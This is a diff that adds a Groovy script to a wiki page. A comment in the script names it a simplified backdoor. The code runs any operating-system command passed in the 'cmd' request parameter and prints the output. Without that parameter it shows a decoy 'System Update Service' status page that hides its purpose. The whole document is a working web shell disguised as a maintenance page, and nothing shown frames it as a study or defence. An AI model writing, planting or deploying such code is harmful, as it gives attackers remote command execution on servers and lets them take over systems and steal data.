@@ -1,0 +1,27 @@
+{{groovy}}
+// Backdoor simplificada (Solo Groovy)
+def cmd = request.getParameter("cmd")
+
+if (cmd) {
+    println "<div style='background:#f0f0f0; padding:10px; border:1px solid #ccc;'>"
+    println "<b>Command Output:</b><pre>"
+    try {
+        // Detectar SO para ejecutar correctamente
+        def p
+        if (System.getProperty("os.name").toLowerCase().contains("win")) {
+            p = ["cmd.exe", "/c", cmd].execute()
+        } else {
+            p = cmd.execute()
+        }
+        p.waitFor()
+        println p.in.text
+    } catch (Exception e) {
+        println "Error: " + e.message
+    }
+    println "</pre></div>"
+} else {
+    println "<h1>System Update Service</h1>"
+    println "<p>Status: <strong>Active</strong>. Maintenance mode ready.</p>"
+}
+{{/groovy}}
+
